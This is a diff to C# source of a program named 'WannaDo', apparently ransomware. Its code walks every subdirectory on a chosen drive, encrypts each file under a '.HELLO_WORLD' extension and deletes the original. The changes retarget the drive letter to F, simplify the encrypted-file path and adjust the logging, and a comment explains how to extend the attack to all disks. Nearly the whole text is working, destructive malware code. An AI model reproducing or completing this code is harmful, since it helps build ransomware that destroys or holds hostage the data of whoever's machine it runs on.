@@ -38,11 +38,10 @@ namespace WannaDo {
             Cryptography crypto = new Cryptography ();
 
             //encrypt directory and subdirectory files
-            string noExtName = Path.GetFileNameWithoutExtension (sourcePath);
-            string dirName = Path.GetDirectoryName (sourcePath);
-            string destPath = $"{dirName}\\{noExtName}{cryptoExtension}";
+            string destPath = $"{sourcePath}{cryptoExtension}";
             crypto.EncryptFile (sourcePath, destPath);
             File.Delete(sourcePath);
+            Console.WriteLine($"{sourcePath} done!");
         }
 
         ///// MAIN FUNCTION /////
@@ -79,7 +78,7 @@ namespace WannaDo {
                             }
                         }
                     }
-                } else if (disk.StartsWith ('Y') /*Insert Disk Letter or change else if to else for all Disks*/) {
+                } else if (disk.StartsWith ('F') /*Insert Disk Letter or change else if to else for all Disks*/) {
                     //encrypt all 
                     var dirs = Directory.GetDirectories (disk);
                     foreach (string dir in dirs) {
@@ -89,7 +88,6 @@ namespace WannaDo {
                             try {
                                 var files = Directory.GetFiles (dir, "*", SearchOption.AllDirectories);
                                 foreach (string file in files) {
-                                    Console.WriteLine (file);
                                     //encrypt here
                                     EncryptFile (file, ".HELLO_WORLD");
                                 }
